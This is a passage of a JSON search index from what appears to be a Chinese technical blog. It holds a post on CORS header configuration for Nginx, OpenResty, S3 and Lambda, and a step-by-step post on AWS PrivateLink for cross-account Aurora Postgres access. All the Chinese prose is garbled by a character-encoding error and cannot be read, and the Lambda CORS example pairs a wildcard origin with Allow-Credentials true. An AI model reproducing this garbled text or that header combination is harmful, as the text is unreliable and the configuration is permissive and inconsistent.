\u0026#34;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization\u0026#34; è¯´ç™½ç‚¹ï¼šå°±æ˜¯å…è®¸çš„æ¥æºç«™ï¼Œå…è®¸çš„æ–¹æ³•ï¼Œå…è®¸çš„å¤´ä¿¡æ¯\né‚£åœ¨ä¸åŒçš„åœ°æ–¹é…ç½®åˆä¸ç›¸åŒï¼š\nä¸€ã€Nginx server { add_header Access-Control-Allow-Origin *; add_header Access-Control-Allow-Methods \u0026#39;GET, POST, OPTIONS\u0026#39;; add_header Access-Control-Allow-Headers \u0026#39;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization\u0026#39;; äºŒã€openrestyä¸­çš„luaè„šæœ¬ location /pg/nginit { rewrite_by_lua_block { ngx.log(ngx.ERR, \u0026#34;Environment configuration update, about to get configuration information from redis\u0026#34;) -- æ·»åŠ è·¨åŸŸ CORS å¤´ ngx.header[\u0026#34;Access-Control-Allow-Origin\u0026#34;] = \u0026#34;*\u0026#34; -- å…è®¸æ‰€æœ‰åŸŸåè¯·æ±‚ ngx.header[\u0026#34;Access-Control-Allow-Methods\u0026#34;] = \u0026#34;GET, POST, OPTIONS\u0026#34; -- å…è®¸çš„æ–¹æ³• ngx.header[\u0026#34;Access-Control-Allow-Headers\u0026#34;] = \u0026#34;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization\u0026#34; -- å…è®¸çš„è¯·æ±‚å¤´ ä¸‰ã€AWSçš„S3 \u0026lt;CORSConfiguration\u0026gt; \u0026lt;CORSRule\u0026gt; \u0026lt;AllowedOrigin\u0026gt;http://example.com\u0026lt;/AllowedOrigin\u0026gt; \u0026lt;AllowedMethod\u0026gt;GET\u0026lt;/AllowedMethod\u0026gt; \u0026lt;AllowedHeader\u0026gt;*\u0026lt;/AllowedHeader\u0026gt; \u0026lt;/CORSRule\u0026gt; \u0026lt;/CORSConfiguration\u0026gt; å››ã€AWS Lambda æˆ–è€… API Gateway headers: { \u0026#39;Access-Control-Allow-Origin\u0026#39;: \u0026#39;*\u0026#39;, \u0026#39;Access-Control-Allow-Credentials\u0026#39;: true, } æœ€åï¼ŒAWSçš„ALBä¸æ”¯æŒé…ç½®CORSï¼ï¼ï¼ï¼Œå¿…é¡»åœ¨åç«¯çš„ application ä¸­è®¾ç½®ã€‚\n","permalink":"https://rendoumi.com/posts/20250617-cors/","summary":"\u003cp\u003eCross-Origin Resource Sharing (CORS) è·¨åŸŸï¼Œä¸€ä¸ªç½‘ç«™å¼•ç”¨äº†å¦å¤–ä¸€ä¸ªç½‘ç«™çš„èµ„æºï¼Œå°±éœ€è¦è·¨åŸŸäº†ã€‚\u003c/p\u003e\n\u003cp\u003eæœ€é€šä¿—ç‚¹ï¼Œå°±æ˜¯æœåŠ¡å™¨çš„è¿”å›å¤´ä¸Šè¦åŠ ä¸Šä¸‰è¡Œï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAccess-Control-Allow-Origin\u003cspan class=\"s2\"\u003e\u0026#34;, \u0026#34;\u003c/span\u003e*\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eAccess-Control-Allow-Methods\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;GET, POST, OPTIONS\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAccess-Control-Allow-Headers\u003cspan class=\"s2\"\u003e\u0026#34;, \u0026#34;\u003c/span\u003eDNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¯´ç™½ç‚¹ï¼šå°±æ˜¯å…è®¸çš„æ¥æºç«™ï¼Œå…è®¸çš„æ–¹æ³•ï¼Œå…è®¸çš„å¤´ä¿¡æ¯\u003c/p\u003e\n\u003cp\u003eé‚£åœ¨ä¸åŒçš„åœ°æ–¹é…ç½®åˆä¸ç›¸åŒï¼š\u003c/p\u003e\n\u003ch5 id=\"ä¸€nginx\"\u003eä¸€ã€Nginx\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    server \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        add_header Access-Control-Allow-Origin *\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        add_header Access-Control-Allow-Methods \u003cspan class=\"s1\"\u003e\u0026#39;GET, POST, OPTIONS\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        add_header Access-Control-Allow-Headers \u003cspan class=\"s1\"\u003e\u0026#39;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"äºŒopenrestyä¸­çš„luaè„šæœ¬\"\u003eäºŒã€openrestyä¸­çš„luaè„šæœ¬\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elocation /pg/nginit \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    rewrite_by_lua_block \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ngx.log\u003cspan class=\"o\"\u003e(\u003c/span\u003engx.ERR, \u003cspan class=\"s2\"\u003e\u0026#34;Environment configuration update, about to get configuration information from redis\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        -- æ·»åŠ è·¨åŸŸ CORS å¤´\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ngx.header\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Access-Control-Allow-Origin\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;*\u0026#34;\u003c/span\u003e  -- å…è®¸æ‰€æœ‰åŸŸåè¯·æ±‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ngx.header\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Access-Control-Allow-Methods\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;GET, POST, OPTIONS\u0026#34;\u003c/span\u003e  -- å…è®¸çš„æ–¹æ³•\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ngx.header\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Access-Control-Allow-Headers\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization\u0026#34;\u003c/span\u003e  -- å…è®¸çš„è¯·æ±‚å¤´\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"ä¸‰awsçš„s3\"\u003eä¸‰ã€AWSçš„S3\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;CORSConfiguration\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u0026lt;CORSRule\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;AllowedOrigin\u0026gt;http://example.com\u0026lt;/AllowedOrigin\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;AllowedMethod\u0026gt;GET\u0026lt;/AllowedMethod\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;AllowedHeader\u0026gt;*\u0026lt;/AllowedHeader\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u0026lt;/CORSRule\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/CORSConfiguration\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"å››aws-lambda-æˆ–è€…-api-gateway\"\u003eå››ã€AWS Lambda æˆ–è€… API Gateway\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eheaders: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s1\"\u003e\u0026#39;Access-Control-Allow-Origin\u0026#39;\u003c/span\u003e: \u003cspan class=\"s1\"\u003e\u0026#39;*\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s1\"\u003e\u0026#39;Access-Control-Allow-Credentials\u0026#39;\u003c/span\u003e: true,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæœ€åï¼ŒAWSçš„ALBä¸æ”¯æŒé…ç½®CORSï¼ï¼ï¼ï¼Œå¿…é¡»åœ¨åç«¯çš„ application ä¸­è®¾ç½®ã€‚\u003c/p\u003e","title":"CORSè·¨åŸŸåœ¨ä¸åŒç¯å¢ƒä¸­çš„é…ç½®"},{"content":"å…¬å¸æœ‰ä¸¤ä¸ªAWSè´¦å·ï¼Œæœ‰å„è‡ªä¸åŒçš„ VPC åŸŸã€‚å…¶ä¸­ä¸€ä¸ªè´¦å·ç”¨åˆ°äº† Aurora Postgres Serveless çš„æ•°æ®åº“ã€‚\nç°åœ¨å¦ä¸€ä¸ªè´¦å·ä¹Ÿéœ€è¦ç”¨åˆ°posgresæ•°æ®åº“ï¼Œæœ€ç›´æ¥çš„æƒ³æ³•æ˜¯åœ¨æœ¬åŸŸå†æ­ä¸€å¥—postgresï¼Œæˆ–è€…ec2æ–°åŠ ä¸€å°ï¼Œä¸Šé¢å®‰è£…posgresã€‚\nå…ˆå»æ£€æŸ¥äº†ä¸€ä¸‹å·²æœ‰çš„postgres serverlessæœåŠ¡ï¼Œç»“æœä½¿ç”¨ç‡æ‰23%ï¼Œå½“ä¸‹å°±ç›´æ¥æƒ³å¤ç”¨å®ƒäº†ã€‚\né‚£èƒ½ä¸èƒ½å•ç‹¬å†å¼€ä¸€ä¸ªdbï¼Œå•ç‹¬ç»™ç¬¬äºŒä¸ªè´¦å·ç”¨å‘¢ï¼ŒæŸ¥äº†åŠå¤©èµ„æ–™ã€‚å¯ä»¥çš„ï¼Œä½†æ˜¯å§ï¼ŒchatgptçœŸçš„æ˜¯æ»¡å˜´èƒ¡è¯´å…«é“ï¼Œè¿å¸¦geminiä¹Ÿæ˜¯ã€‚\nawså®¶çš„ä¸œè¥¿éƒ½æ˜¯å¼€æºç»è¿‡é­”æ”¹ï¼Œè·Ÿç½‘ä¸Šå å¤§å¤šæ•°çš„èµ„æ–™æ˜¯ä¸åŒçš„ï¼Œè¿™ç›´æ¥å¯¼è‡´ chatgpt æŒ‰ç…§ç½‘ä¸Šå¤§å¤šæ•°æ–‡æ¡£æ¥è¿›è¡Œæ¨ç†ï¼Œå¯¼è‡´é”™è¯¯ï¼ï¼ï¼\nè¿˜æœ‰å°±æ˜¯awså®¶çš„ä¸œè¥¿æ›´æ–°ä¿®æ”¹å¾ˆå¿«ï¼Œæœ€æ–°çš„æ–‡æ¡£å’Œä¹‹å‰çš„æ–‡æ¡£ä¸åŒï¼Œä¹Ÿå¯¼è‡´ chatpt æŒ‰ç…§ç½‘ä¸Šå¤§å¤šæ•°çš„æ—§æ–‡æ¡£æ¥è¿›è¡Œæ¨ç†ï¼Œå¯¼è‡´é”™è¯¯ï¼ï¼ï¼\nè¿™ä¸ªä¸œè¥¿çš„æ¶æ„å›¾å¦‚ä¸Šï¼Œå³è¾¹çš„VPCé‡Œé¢è¿ç€ aurora æœåŠ¡ï¼Œå®ƒå®é™…æ˜¯target groupçš„ä¸€ä¸ªç›®æ ‡ï¼Œç„¶åä¸Šè”åˆ°nlbï¼Œnlbå†ä¸Šè”åˆ°endpoint serviceï¼Œå¯¹å¤–æä¾›æœåŠ¡.\nç„¶åå·¦é¢VPCä¸­å»ºendpointï¼Œé€šè¿‡PrivateLinkè¿æ¥åˆ°å³è¾¹çš„EndpointServiceï¼Œè¿™æ ·é€šè¿‡ç§æœ‰çš„dns nameå’Œsecurity groupå†è¿›è¡Œæ§åˆ¶ï¼Œå°±å¯ä»¥ç›´æ¥è¿åˆ°å³è¾¹çš„endpoint serviceæœåŠ¡èµ„æºäº†ã€‚\nå…·ä½“çš„åšæ³•æ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€ç¬¬ä¸€æ­¥ï¼Œå³è¾¹çš„VPCä¸­ 1ã€å»ºç«‹EndpointService\nåˆ°VPCä¸­ï¼Œå·¦è¾¹çš„Endpoint Servicesï¼Œç‚¹å‡»ï¼š\nç‚¹å‡»Create endpoint serviceæ–°å»ºä¸€ä¸ª\nåå­—ï¼špostgresql-serverless-endpoint-serviceï¼Œç”±äºç°åœ¨è¿˜æ²¡æœ‰nlbï¼Œéœ€è¦å†æ–°å»ºä¸€ä¸ªï¼›ç‚¹å‡»Create new load balancer\n2ã€å»ºç«‹nlb\nç‚¹å‡»ï¼šCreate load balanceræ–°å»º\nè¿™ä¸ªç±»å‹ï¼Œåªèƒ½æ˜¯nlb\næˆ‘ä»¬è¿™ä¸ªnlbï¼Œä¸æ”¾åœ¨å…¬ç½‘ï¼Œä¸å…¬å¼€ï¼Œæ‰€ä»¥é€‰ç§æœ‰çš„Internalï¼Œåªæœ‰IPV4ï¼Œä¸æä¾›IPV6.\nç½‘ç»œé€‰è¯¥VPCï¼Œå­ç½‘é€‰æ‹©ä¸‰ä¸ªprivateçš„å­ç½‘\nSecurity groupsé€‰æ‹©ä¸€ä¸‹ï¼Œè¿™é‡Œrds-sgçš„inboundè§„åˆ™æ˜¯å…è®¸TCPç«¯å£5432çš„è¿›å…¥ï¼Œå¦‚æœæ²¡æœ‰å°±æ–°å»ºä¸€ä¸ªSG\nåˆ°æœ€åäº†ï¼Œå±…ç„¶è¿˜æ²¡æœ‰target groupï¼Œé‚£åˆè¦å»ºä¸€ä¸ªäº†ï¼Œç‚¹å‡»Create target groupå»ºç«‹\n3ã€å»ºç«‹target group\nåå­—å«åšï¼špostgres-target-group\næˆ‘ä»¬é€‰IP addressesï¼Œå› ä¸ºè¦è¿åˆ°åé¢çš„postgresæœåŠ¡\nç„¶åé€‰å¥½TCPï¼ŒPort 5432ï¼Œ IPV4ï¼ŒVPCï¼Œå…¶å®ƒä¿æŒç¼ºçœï¼Œç„¶åå»ºç«‹\n4ã€æ³¨å†Œtarget group\ntarget groupå»ºç«‹å¥½ä»¥åï¼Œæˆ‘ä»¬è¦æŠŠPostgresçš„æœåŠ¡IPç»™æ³¨å†Œä¸Šå»\nç‚¹å‡»Register targetsæ–°å»º\næˆ‘ä»¬æŠŠposgres serverlessæœåŠ¡è§£æå‡ºæ¥çš„IPåœ°å€å¤©ä¸Šå»ï¼Œç«¯å£ä¹Ÿå¡«ä¸Š5432ï¼Œç„¶åæ³¨å†Œä¸Šå»å³å¯ã€‚\næ³¨å†Œå¥½äº†ä»¥åä¼šçœ‹åˆ°çŠ¶æ€healthyæ˜¯ç»¿è‰²çš„ã€‚è¿™æ ·å°±okäº†\n4ã€å®Œæˆnlb\ntarget groupå¥½äº†ä»¥åï¼Œæˆ‘ä»¬è¿”å›nlbï¼Œå…¶ä½™ä¿æŒåˆå§‹å€¼ï¼Œå®Œæˆåˆ›å»º\n5ã€å®Œæˆendpoint service\nnlbå¥½äº†ä»¥åï¼Œæˆ‘ä»¬è¿”å›endpoint serviceï¼Œåˆ·æ–°nlbï¼Œç„¶åé€‰ä¸­æ–°å»ºçš„nlbï¼Œç„¶åä¸‹é¢ä¸é€‰Supported Regionsï¼Œå› ä¸ºè¿™ä¸ªè·¨å¤šä¸ªregionçš„ï¼Œæˆ‘ä»¬ä¸¤ä¸ªvpcéƒ½åœ¨åŒä¸€åŒºåŸŸã€‚\né€‰ä¸­Acceptance requiredï¼Œæ„æ€æ˜¯éœ€è¦æ‰¹å‡†endpointçš„è¿å…¥è¯·æ±‚ï¼Œå†é€‰ä¸­æ”¯æŒIPV4ï¼Œç„¶åç‚¹å‡»åˆ›å»º\n5ã€èµ‹äºˆendpoint serviceè®¿é—®æƒé™\nå»ºå¥½åï¼Œæˆ‘ä»¬å»æŸ¥çœ‹è¿™ä¸ªEndpoint serviceæœåŠ¡\nå…ˆç‚¹å‡»ï¼ŒAllow principals çš„ tab é¡µï¼Œç„¶åç‚¹å‡»Allow principalsæ–°å»º\næ·»åŠ å¦ä¸€ä¸ªvpcçš„è´¦å·ï¼šarn:aws:iam::01234567981011:root\næ³¨æ„ä¸­é—´iamåé¢çš„ä¸€ä¸²æ•°å­—ï¼Œå°±æ˜¯å¦ä¸€ä¸ªè´¦å·ç™»å½•åçš„accound idï¼Œä¹Ÿå°±æ˜¯AWS_PROFILEä¸­å€¼ä¸­çš„é‚£ä¸²æ•°å­—\nè¿™æ ·å¦ä¸€ä¸ªvpcåŸŸçš„æ‰€æœ‰èµ„æºéƒ½å¯ä»¥è®¿é—®åˆ°è¿™ä¸ªendpoint serviceäº†\nä¹‹åè¿˜è¦åœ¨Endpoint connections çš„ tab é¡µä¸­æ‰¹å‡†æ–°è¿æ¥ã€‚\nåŒæ—¶æŠŠService nameç»™æ‹·è´ä¸‹æ¥ï¼šcom.amazonaws.vpce.ap-southeast-1.vpce-svc-11111111111\näºŒã€å·¦è¾¹çš„VPCä¸­ 1ã€å»ºç«‹Endpoint\nå»åˆ°VPCï¼Œå»ºendpointï¼Œç‚¹å‡»Create ednpointæ–°å»º\nåå­—ï¼šmy-endpoint-postgresï¼Œé€‰æ‹©ç±»å‹æ˜¯Endpoint services that use NLBs and GWLBs\nç„¶åService settingsè¾“å…¥å³è¾¹VPC ä¸Š endpoint service æ‹·è´çš„service nameï¼Œè¿›è¡ŒéªŒè¯ï¼šcom.amazonaws.vpce.ap-southeast-1.vpce-svc-11111111111\nç„¶åå°±å¾—å»ç™»å½•å³è¾¹vpcçš„è´¦å·ï¼Œåœ¨Endpoint connectionsä¸­æ‰¹å‡†è¿™ä¸ªæ–°è¿æ¥ã€‚\nç„¶åå†è¿”å›æ¥ï¼Œé€‰VPCï¼Œé€‰å­ç½‘ï¼Œé€‰SGã€‚è¿™é‡Œæˆ‘ä»¬åŒæ ·é€‰ç§ç½‘çš„ä¸‰ä¸ªå­ç½‘ã€‚SGåŒæ ·æ˜¯inboundæ˜¯TCP æ”¾è¡Œ5432ç«¯å£ï¼Œæ²¡æœ‰å°±æ–°å»ºä¸€ä¸ª\nè¿™æ ·endpointå°±å»ºå¥½äº†ã€‚æŸ¥çœ‹å®ƒdetailçš„tabé¡µï¼Œæ‹·è´ä¸‹æ¥DNS names\n2ã€æµ‹è¯•\næˆ‘ä»¬åœ¨å·¦è¾¹VPCçš„æœºå™¨é‡Œèµ·ä¸ªshellï¼Œç”¨dns nameè¿æ¥5432ç«¯å£ï¼Œæµ‹é€šå³å¯\ntelnet vpce-xxxx.vpce-svc-xxxx.ap-southeast-1.vpce.amazonaws.com 5432 ","permalink":"https://rendoumi.com/posts/20250521-aws_endpoint/","summary":"\u003cp\u003eå…¬å¸æœ‰ä¸¤ä¸ªAWSè´¦å·ï¼Œæœ‰å„è‡ªä¸åŒçš„ VPC åŸŸã€‚å…¶ä¸­ä¸€ä¸ªè´¦å·ç”¨åˆ°äº† Aurora Postgres Serveless çš„æ•°æ®åº“ã€‚\u003c/p\u003e\n\u003cp\u003eç°åœ¨å¦ä¸€ä¸ªè´¦å·ä¹Ÿéœ€è¦ç”¨åˆ°posgresæ•°æ®åº“ï¼Œæœ€ç›´æ¥çš„æƒ³æ³•æ˜¯åœ¨æœ¬åŸŸå†æ­ä¸€å¥—postgresï¼Œæˆ–è€…ec2æ–°åŠ ä¸€å°ï¼Œä¸Šé¢å®‰è£…posgresã€‚\u003c/p\u003e\n\u003cp\u003eå…ˆå»æ£€æŸ¥äº†ä¸€ä¸‹å·²æœ‰çš„postgres serverlessæœåŠ¡ï¼Œç»“æœä½¿ç”¨ç‡æ‰23%ï¼Œå½“ä¸‹å°±ç›´æ¥æƒ³å¤ç”¨å®ƒäº†ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£èƒ½ä¸èƒ½å•ç‹¬å†å¼€ä¸€ä¸ªdbï¼Œå•ç‹¬ç»™ç¬¬äºŒä¸ªè´¦å·ç”¨å‘¢ï¼ŒæŸ¥äº†åŠå¤©èµ„æ–™ã€‚å¯ä»¥çš„ï¼Œä½†æ˜¯å§ï¼ŒchatgptçœŸçš„æ˜¯æ»¡å˜´èƒ¡è¯´å…«é“ï¼Œè¿å¸¦geminiä¹Ÿæ˜¯ã€‚\u003c/p\u003e\n\u003cp\u003eawså®¶çš„ä¸œè¥¿éƒ½æ˜¯å¼€æºç»è¿‡é­”æ”¹ï¼Œè·Ÿç½‘ä¸Šå å¤§å¤šæ•°çš„èµ„æ–™æ˜¯ä¸åŒçš„ï¼Œè¿™ç›´æ¥å¯¼è‡´ chatgpt æŒ‰ç…§ç½‘ä¸Šå¤§å¤šæ•°æ–‡æ¡£æ¥è¿›è¡Œæ¨ç†ï¼Œå¯¼è‡´é”™è¯¯ï¼ï¼ï¼\u003c/p\u003e\n\u003cp\u003eè¿˜æœ‰å°±æ˜¯awså®¶çš„ä¸œè¥¿æ›´æ–°ä¿®æ”¹å¾ˆå¿«ï¼Œæœ€æ–°çš„æ–‡æ¡£å’Œä¹‹å‰çš„æ–‡æ¡£ä¸åŒï¼Œä¹Ÿå¯¼è‡´ chatpt æŒ‰ç…§ç½‘ä¸Šå¤§å¤šæ•°çš„æ—§æ–‡æ¡£æ¥è¿›è¡Œæ¨ç†ï¼Œå¯¼è‡´é”™è¯¯ï¼ï¼ï¼\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521100034306\" loading=\"lazy\" src=\"/posts/20250521-aws_endpoint/image-20250521100034306.png\"\u003e\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªä¸œè¥¿çš„æ¶æ„å›¾å¦‚ä¸Šï¼Œå³è¾¹çš„VPCé‡Œé¢è¿ç€ aurora æœåŠ¡ï¼Œå®ƒå®é™…æ˜¯target groupçš„ä¸€ä¸ªç›®æ ‡ï¼Œç„¶åä¸Šè”åˆ°nlbï¼Œnlbå†ä¸Šè”åˆ°endpoint serviceï¼Œå¯¹å¤–æä¾›æœåŠ¡.\u003c/p\u003e\n\u003cp\u003eç„¶åå·¦é¢VPCä¸­å»ºendpointï¼Œé€šè¿‡PrivateLinkè¿æ¥åˆ°å³è¾¹çš„EndpointServiceï¼Œè¿™æ ·é€šè¿‡ç§æœ‰çš„dns nameå’Œsecurity groupå†è¿›è¡Œæ§åˆ¶ï¼Œå°±å¯ä»¥ç›´æ¥è¿åˆ°å³è¾¹çš„endpoint serviceæœåŠ¡èµ„æºäº†ã€‚\u003c/p\u003e\n\u003cp\u003eå…·ä½“çš„åšæ³•æ­¥éª¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003ch2 id=\"ä¸€ç¬¬ä¸€æ­¥å³è¾¹çš„vpcä¸­\"\u003eä¸€ã€ç¬¬ä¸€æ­¥ï¼Œå³è¾¹çš„VPCä¸­\u003c/h2\u003e\n\u003cp\u003e1ã€å»ºç«‹EndpointService\u003c/p\u003e\n\u003cp\u003eåˆ°VPCä¸­ï¼Œå·¦è¾¹çš„Endpoint Servicesï¼Œç‚¹å‡»ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521105156766\" loading=\"lazy\" src=\"/posts/20250521-aws_endpoint/image-20250521105156766.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç‚¹å‡»Create endpoint serviceæ–°å»ºä¸€ä¸ª\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521100551854\" loading=\"lazy\" src=\"/posts/20250521-aws_endpoint/image-20250521100551854.png\"\u003e\u003c/p\u003e\n\u003cp\u003eåå­—ï¼špostgresql-serverless-endpoint-serviceï¼Œç”±äºç°åœ¨è¿˜æ²¡æœ‰nlbï¼Œéœ€è¦å†æ–°å»ºä¸€ä¸ªï¼›ç‚¹å‡»Create new load balancer\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521100641452\" loading=\"lazy\" src=\"/posts/20250521-aws_endpoint/image-20250521100641452.png\"\u003e\u003c/p\u003e\n\u003cp\u003e2ã€å»ºç«‹nlb\u003c/p\u003e\n\u003cp\u003eç‚¹å‡»ï¼šCreate load balanceræ–°å»º\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521100713535\" loading=\"lazy\" src=\"/posts/20250521-aws_endpoint/image-20250521100713535.png\"\u003e\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªç±»å‹ï¼Œåªèƒ½æ˜¯nlb\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521100748945\" loading=\"lazy\" src=\"/posts/20250521-aws_endpoint/image-20250521100748945.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬è¿™ä¸ªnlbï¼Œä¸æ”¾åœ¨å…¬ç½‘ï¼Œä¸å…¬å¼€ï¼Œæ‰€ä»¥é€‰ç§æœ‰çš„Internalï¼Œåªæœ‰IPV4ï¼Œä¸æä¾›IPV6.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521100909962\" loading=\"lazy\" src=\"/posts/20250521-aws_endpoint/image-20250521100909962.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç½‘ç»œé€‰è¯¥VPCï¼Œå­ç½‘é€‰æ‹©ä¸‰ä¸ªprivateçš„å­ç½‘\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521101224868\" loading=\"lazy\" src=\"/posts/20250521-aws_endpoint/image-20250521101224868.png\"\u003e\u003c/p\u003e\n\u003cp\u003eSecurity groupsé€‰æ‹©ä¸€ä¸‹ï¼Œè¿™é‡Œrds-sgçš„inboundè§„åˆ™æ˜¯å…è®¸TCPç«¯å£5432çš„è¿›å…¥ï¼Œå¦‚æœæ²¡æœ‰å°±æ–°å»ºä¸€ä¸ªSG\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521101324400\" loading=\"lazy\" 